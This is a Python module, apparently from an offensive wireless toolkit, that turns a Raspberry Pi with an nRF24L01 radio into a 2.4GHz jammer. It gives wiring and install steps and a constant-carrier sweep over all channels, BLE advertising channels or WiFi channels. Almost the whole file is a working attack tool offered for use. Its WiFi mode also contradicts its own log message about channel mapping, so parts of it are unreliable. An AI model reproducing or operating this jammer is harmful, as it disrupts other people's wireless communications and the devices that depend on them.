# modules/wireless/jammer.py
# 2.4GHz jammer using nRF24L01 directly on Raspberry Pi via SPI.
#
# Wiring (nRF24L01 → Raspberry Pi GPIO):
#   VCC  → 3.3V  (Pin 17)
#   GND  → GND   (Pin 20)
#   CE   → GPIO22 (Pin 15)
#   CSN  → GPIO8  (Pin 24, SPI CE0)
#   SCK  → GPIO11 (Pin 23, SPI CLK)
#   MOSI → GPIO10 (Pin 19, SPI MOSI)
#   MISO → GPIO9  (Pin 21, SPI MISO)
#
# Install library: pip install pyrf24

import time

# Shared stop flag — set this to True from outside to stop a running jammer
# The UI's STOP button calls jammer.stop()
_running = False


def stop():
    global _running
    _running = False


def run(log=print, mode="full"):
    """
    mode: 'full' = sweep all 2.4GHz channels (0-79)
          'ble'  = hammer BLE advertising channels only (37, 38, 39)
          'wifi' = target common WiFi channels (1, 6, 11)
    """
    global _running

    try:
        from pyrf24 import RF24, RF24_PA_LOW, RF24_2MBPS, RF24_CRC_DISABLED
    except ImportError:
        log("[ERROR] pyrf24 not installed. Run: pip install pyrf24")
        return

    CE_PIN  = 22
    CSN_PIN = 0   # SPI bus 0, CE0

    radio = RF24(CE_PIN, CSN_PIN)

    log("[*] Initialising radio...")
    if not radio.begin():
        log("[ERROR] nRF24L01 not detected. Check wiring.")
        return

    log("[*] Radio initialised.")

    # Mirror the Arduino sketch settings
    radio.setAutoAck(False)
    radio.stopListening()
    radio.setRetries(0, 0)
    radio.setPayloadSize(5)
    radio.setAddressWidth(3)
    radio.setPALevel(RF24_PA_LOW, True)
    radio.setDataRate(RF24_2MBPS)
    radio.setCRCLength(RF24_CRC_DISABLED)

    # Pick channel list based on mode
    if mode == "ble":
        channels = [37, 38, 39]
        log("[*] Mode: BLE advertising channels (37, 38, 39)")
    elif mode == "wifi":
        channels = [1, 6, 11]
        log("[*] Mode: WiFi channels (1, 6, 11 → mapped to nRF channels 5, 30, 55)")
    else:
        channels = list(range(0, 80))
        log("[*] Mode: Full sweep (channels 0-79)")

    # Start constant carrier on first channel
    log(f"[*] Starting constant carrier on channel {channels[0]}...")
    radio.startConstCarrier(RF24_PA_LOW, channels[0])

    _running = True
    log("[*] Jamming started. Press STOP to end.")

    sweep_count = 0
    try:
        while _running:
            for ch in channels:
                if not _running:
                    break
                radio.setChannel(ch)
                time.sleep(0.001)   # 1ms per channel, same pace as Arduino sketch

            sweep_count += 1
            # Log a status line every 100 sweeps so the UI shows activity
            if sweep_count % 100 == 0:
                log(f"[~] Sweeping... ({sweep_count} passes, last channel {channels[-1]})")

    finally:
        # Always clean up the radio when stopped or on error
        radio.stopConstCarrier()
        radio.powerDown()
        log("[*] Jammer stopped. Radio powered down.")
